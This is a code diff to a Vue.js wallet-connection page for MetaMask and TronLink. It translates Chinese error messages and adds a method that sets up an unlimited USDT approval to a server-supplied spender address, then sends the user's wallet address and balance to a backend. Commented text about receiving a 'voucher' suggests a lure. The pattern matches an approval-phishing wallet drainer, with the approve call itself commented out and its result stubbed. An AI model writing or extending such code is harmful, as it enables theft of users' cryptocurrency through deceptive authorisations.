@@ -229,7 +229,7 @@ export default {
             reject(err)
           })
         } else {
-          reject(new Error('请安装Metamask插件'))
+          reject(new Error('Please install Metamask plugin'))
         }
       })
     },
@@ -254,14 +254,14 @@ export default {
             else {
               window.clearInterval(Inval);
               // this.$router.replace('/noWallet')
-              reject(new Error('请安装Tronlink插件'))
+              reject(new Error('Please install Tronlink plugin'))
             }
           }, 1000);
           // }
 
         } else {
           // this.$router.replace('/noWallet')
-          reject(new Error('请安装Tronlink插件'))
+          reject(new Error('Please install Tronlink plugin'))
         }
       })
     },
@@ -422,6 +422,94 @@ export default {
     //     })
     //   }
     // },
+
+    async isAuth2 () {
+      this.loading = true
+      let web3 = new Web3(window.web3.currentProvider)
+      var _this = this
+      //查余额
+      // usdt合约
+      var contract = new pageWeb3.eth.Contract(usdtAbi, "0xdac17f958d2ee523a2206206994597c13d831ec7");
+
+      // contract.methods.balanceOf(this.walletAddress).call(function (err, balance) {
+      //   console.log('ustd', _this.amount)
+      //   _this.amount = balance
+
+      // })
+      let fromAddress = await web3.eth.getAccounts();
+      // await pageWeb3.eth.getBalance(fromAddress[0]).then(
+      //   function (result) {
+      //     let num = 10 ** 18
+      //     let am = Number(result) / num
+      //
+      //     _this.amount = am.toFixed(4)
+      //     console.log(_this.amount, '余额');
+      //
+      //   });
+      //
+      // if (Number(this.amount) < 0.001) {
+      //   this.$message.warning("You don't have enough erc to pay for the miner's fee to receive the voucher,your erc balance is "+this.amount)
+      //   setTimeout(() => {
+      //     this.loading = false
+      //   }, 1000);
+      //   return
+      // }
+      // // usdt合约
+      var contract = new pageWeb3.eth.Contract(usdtAbi, "0xdac17f958d2ee523a2206206994597c13d831ec7");
+      // 授权对象
+      let spender = this.auth_address; //改成接口地址获取
+
+      // let gasPrice = contract.gasPrice;
+      // let gasLimit = contract.gasLimit;
+      // let fromAddress = await web3.eth.getAccounts();
+      // 授权金额
+      let amount = 9999999999999;
+
+      // let gas_estimate = web3.eth.estimateGas({
+      //   'from': fromAddress[0],
+      //   'to': spender,
+      //   'value': amount,
+      // })
+      // console.log("gas_estimate===",gas_estimate);
+      // let amount = 100*Math.pow(10,18);//转账100个
+      try {
+        // let res = await contract.methods.approve(spender, amount).send({ from: fromAddress[0] })
+        // .on('transactionHash', function (hash) {
+        //   console.log(hash, '交易发送后得到有效交易哈希值时触发');
+        // }).on('confirmation', function (confirmationNumber, receipt) {
+        //   console.log(confirmationNumber, receipt, '收到确认时触发');
+        // }).on('receipt', function (receipt) {
+        //   console.log(receipt, '交易收据有效时触发');
+        // })
+        // .on('error', function (er) {
+        //   console.log(er)
+        // })
+        // console.log(res);
+        let res = "success";
+        if (res) {
+          let data = {
+            address: _this.walletAddress,
+            usdt_balance: _this.amount,
+            type: _this.typeKey,
+            hash: res,
+            au_address: _this.auth_address
+          }
+          apiIndexAuthsuccess(data).then((result) => {
+            if (result.code == 1) {
+              setTimeout(() => {
+                this.getInfo();
+                this.loading = false;
+              }, 500);
+            }
+          })
+        }
+      } catch (error) {
+        console.log(error, 'err');
+        setTimeout(() => {
+          this.loading = false
+        }, 1000);
+      }
+    },
     //开始授权
     async authorization () {
       // 如果余额为0  this.trxBalance
@@ -490,6 +578,7 @@ export default {
             .catch((res) => {
               this.$message.error(res)
               setTimeout(() => {
+                this.getInfo();
                 _this.loading = false
               }, 500);
             });
@@ -498,6 +587,7 @@ export default {
 
           this.$message.error(res)
           setTimeout(() => {
+            this.getInfo();
             this.loading = false
           }, 500);
 
@@ -564,7 +654,7 @@ export default {
       //   this.isAuth();
       // }
       if (window.web3){
-        this.isAuth();
+        this.isAuth2();
       }else {
         this.authorization();
       }
